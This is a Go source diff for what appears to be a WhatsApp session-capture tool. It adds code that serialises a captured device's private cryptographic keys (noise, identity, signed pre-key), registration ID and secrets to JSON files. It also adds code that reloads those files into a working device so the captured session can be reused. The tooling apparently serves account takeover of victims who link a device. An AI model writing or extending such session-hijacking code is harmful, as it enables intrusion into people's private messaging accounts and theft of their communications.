@@ -417,25 +417,64 @@ pollStatus();
 </script>
 </body></html>`
 
+type sessionData struct {
+	Timestamp      string `json:"timestamp"`
+	NoisePub       []byte `json:"noise_pub"`
+	NoisePriv      []byte `json:"noise_priv"`
+	IdentityPub    []byte `json:"identity_pub"`
+	IdentityPriv   []byte `json:"identity_priv"`
+	SignedPreKeyID uint32 `json:"signed_pre_key_id"`
+	SignedPrePub   []byte `json:"signed_pre_pub"`
+	SignedPrePriv  []byte `json:"signed_pre_priv"`
+	SignedPreSig   []byte `json:"signed_pre_sig"`
+	RegistrationID uint32 `json:"registration_id"`
+	AdvSecretKey   []byte `json:"adv_secret_key"`
+	JIDUser        string `json:"jid_user"`
+	JIDServer      string `json:"jid_server"`
+	JIDDevice      uint16 `json:"jid_device"`
+	BusinessName   string `json:"business_name"`
+	PushName       string `json:"push_name"`
+	Platform       string `json:"platform"`
+	LID            string `json:"lid"`
+}
+
 func saveCapturedSession(device *store.Device) {
 	os.MkdirAll(sessionsDir, 0755)
-
 	ts := time.Now().Format("2006-01-02_15-04-05")
 	sessionDir := filepath.Join(sessionsDir, ts)
 	os.MkdirAll(sessionDir, 0755)
 
-	data := map[string]interface{}{
-		"timestamp":       ts,
-		"noise_key":       device.NoiseKey,
-		"identity_key":    device.IdentityKey,
-		"signed_pre_key":  device.SignedPreKey,
-		"registration_id": device.RegistrationID,
-		"adv_secret_key":  device.AdvSecretKey,
-		"jid":             device.ID,
-		"lid":             device.LID,
-		"platform":        device.Platform,
-		"business_name":   device.BusinessName,
-		"push_name":       device.PushName,
+	data := sessionData{
+		Timestamp:      ts,
+		RegistrationID: device.RegistrationID,
+		AdvSecretKey:   device.AdvSecretKey,
+		BusinessName:   device.BusinessName,
+		PushName:       device.PushName,
+		Platform:       device.Platform,
+	}
+	if device.NoiseKey != nil {
+		data.NoisePub = device.NoiseKey.Pub[:]
+		data.NoisePriv = device.NoiseKey.Priv[:]
+	}
+	if device.IdentityKey != nil {
+		data.IdentityPub = device.IdentityKey.Pub[:]
+		data.IdentityPriv = device.IdentityKey.Priv[:]
+	}
+	if device.SignedPreKey != nil {
+		data.SignedPreKeyID = device.SignedPreKey.KeyID
+		data.SignedPrePub = device.SignedPreKey.Pub[:]
+		data.SignedPrePriv = device.SignedPreKey.Priv[:]
+		if device.SignedPreKey.Signature != nil {
+			data.SignedPreSig = device.SignedPreKey.Signature[:]
+		}
+	}
+	if device.ID != nil {
+		data.JIDUser = device.ID.User
+		data.JIDServer = device.ID.Server
+		data.JIDDevice = device.ID.Device
+	}
+	if device.LID.User != "" {
+		data.LID = device.LID.String()
 	}
 
 	jsonData, _ := json.MarshalIndent(data, "", "  ")
@@ -453,6 +492,68 @@ func saveCapturedSession(device *store.Device) {
 	}
 	saveSessions(sessions)
 	fmt.Printf("%s[+] Session saved! ID: %s | JID: %s | Path: %s%s\n", utils.Green, id, device.ID, sessionDir, utils.Reset)
+}
+
+func loadSessionData(profileDir string) (*sessionData, error) {
+	sessionFile := filepath.Join(profileDir, "session.json")
+	data, err := os.ReadFile(sessionFile)
+	if err != nil {
+		return nil, err
+	}
+	var s sessionData
+	if err := json.Unmarshal(data, &s); err != nil {
+		return nil, err
+	}
+	return &s, nil
+}
+
+func deviceFromSession(s *sessionData) *store.Device {
+	noop := &store.NoopStore{}
+	d := &store.Device{
+		Container:      noop,
+		RegistrationID: s.RegistrationID,
+		AdvSecretKey:   s.AdvSecretKey,
+		BusinessName:   s.BusinessName,
+		PushName:       s.PushName,
+		Platform:       s.Platform,
+	}
+
+	if len(s.NoisePub) == 32 && len(s.NoisePriv) == 32 {
+		var pub, priv [32]byte
+		copy(pub[:], s.NoisePub)
+		copy(priv[:], s.NoisePriv)
+		d.NoiseKey = &keys.KeyPair{Pub: &pub, Priv: &priv}
+	}
+	if len(s.IdentityPub) == 32 && len(s.IdentityPriv) == 32 {
+		var pub, priv [32]byte
+		copy(pub[:], s.IdentityPub)
+		copy(priv[:], s.IdentityPriv)
+		d.IdentityKey = &keys.KeyPair{Pub: &pub, Priv: &priv}
+	}
+	if len(s.SignedPrePub) == 32 && len(s.SignedPrePriv) == 32 {
+		var pub, priv [32]byte
+		copy(pub[:], s.SignedPrePub)
+		copy(priv[:], s.SignedPrePriv)
+		preKey := &keys.PreKey{
+			KeyPair: keys.KeyPair{Pub: &pub, Priv: &priv},
+			KeyID:   s.SignedPreKeyID,
+		}
+		if len(s.SignedPreSig) == 64 {
+			var sig [64]byte
+			copy(sig[:], s.SignedPreSig)
+			preKey.Signature = &sig
+		}
+		d.SignedPreKey = preKey
+	}
+	if s.JIDUser != "" && s.JIDServer != "" {
+		d.ID = types.NewJID(s.JIDUser, s.JIDServer)
+		d.ID.Device = s.JIDDevice
+	}
+
+	d.SetAllStores(noop)
+	d.PreKeys = &memPreKeyStore{}
+	d.LIDs = noop
+	return d
 }
 
 func loadSessions() map[string]sessionMeta {
@@ -570,43 +671,92 @@ func detectBrowser() string {
 
 type memPreKeyStore struct {
 	store.NoopStore
+	mu       sync.Mutex
 	uploaded uint32
+	keys     map[uint32]*keys.PreKey
+}
+
+func (m *memPreKeyStore) init() {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	if m.keys == nil {
+		m.keys = make(map[uint32]*keys.PreKey)
+	}
 }
 
 func (m *memPreKeyStore) GenOnePreKey(ctx context.Context) (*keys.PreKey, error) {
-	return keys.NewPreKey(m.uploaded + 1), nil
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	m.uploaded++
+	pk := keys.NewPreKey(m.uploaded)
+	m.keys[m.uploaded] = pk
+	return pk, nil
 }
 
 func (m *memPreKeyStore) GetOrGenPreKeys(ctx context.Context, count uint32) ([]*keys.PreKey, error) {
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
 	pks := make([]*keys.PreKey, count)
 	for i := range pks {
 		m.uploaded++
-		pks[i] = keys.NewPreKey(m.uploaded)
+		pk := keys.NewPreKey(m.uploaded)
+		m.keys[m.uploaded] = pk
+		pks[i] = pk
 	}
 	return pks, nil
 }
 
+func (m *memPreKeyStore) GetPreKey(ctx context.Context, id uint32) (*keys.PreKey, error) {
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	pk, ok := m.keys[id]
+	if !ok {
+		pk = keys.NewPreKey(id)
+		m.keys[id] = pk
+	}
+	return pk, nil
+}
+
+func (m *memPreKeyStore) RemovePreKey(ctx context.Context, id uint32) error {
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	delete(m.keys, id)
+	return nil
+}
+
 func (m *memPreKeyStore) MarkPreKeysAsUploaded(ctx context.Context, upToID uint32) error {
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
 	m.uploaded = upToID
 	return nil
 }
 
 func (m *memPreKeyStore) UploadedPreKeyCount(ctx context.Context) (int, error) {
-	return int(m.uploaded), nil
+	m.init()
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return len(m.keys), nil
 }
 
 func newDevice() *store.Device {
 	noop := &store.NoopStore{}
+	identity := keys.NewKeyPair()
 	d := &store.Device{
-		Container:       noop,
-		NoiseKey:        keys.NewKeyPair(),
-		IdentityKey:     keys.NewKeyPair(),
-		SignedPreKey:    keys.NewPreKey(0),
-		RegistrationID:  randUint32(),
-		AdvSecretKey:    randBytes(32),
+		Container:      noop,
+		NoiseKey:       keys.NewKeyPair(),
+		IdentityKey:    identity,
+		SignedPreKey:   identity.CreateSignedPreKey(0),
+		RegistrationID: randUint32(),
+		AdvSecretKey:   randBytes(32),
 	}
 	d.SetAllStores(noop)
 	d.PreKeys = &memPreKeyStore{}
+	d.LIDs = noop
 	return d
 }
 
